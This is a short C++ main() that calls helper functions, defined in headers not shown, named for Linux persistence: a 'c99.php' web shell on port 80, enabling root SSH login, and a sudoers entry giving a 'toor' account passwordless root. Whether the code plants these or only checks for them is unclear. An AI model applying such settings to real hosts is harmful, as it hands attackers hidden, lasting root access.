#include <iostream>
#include "backdoor.hpp"
#include "serviceConfig.hpp"

int main(){

    //isPortOpen("80");
    //isPortOpen("22");
    backdoor("/var/www/c99.php", "80");
    backdoor("/home/ubuntu/test.txt");
    //isStringInFile("/etc/ssh/sshd_config", "PermitRootLogin yes");
    rootLoginSSH("PermitRootLogin yes");
    sudoersFile("/etc/sudoers.d/toor");
    sudoersEntry("toor ALL=(ALL) NOPASSWD:ALL");

    return 0;
}
